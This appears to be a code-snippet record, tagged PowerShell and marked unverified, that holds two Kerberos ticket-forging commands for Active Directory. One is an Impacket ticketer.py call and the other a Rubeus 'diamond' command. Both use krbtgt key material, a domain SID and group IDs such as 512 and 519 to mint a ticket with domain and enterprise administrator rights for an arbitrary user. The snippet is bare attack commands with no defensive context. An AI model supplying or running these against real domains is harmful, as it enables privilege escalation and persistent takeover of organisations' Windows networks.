---
id: c7bd0eeb-3c17-44de-8dbf-2936a5cd70a5
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:04.881671+00:00'
updated_at: '2023-04-10T20:26:29.274683+00:00'
---

# Code Snippet c7bd0eeb

**Language**: ps1

```ps1
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```


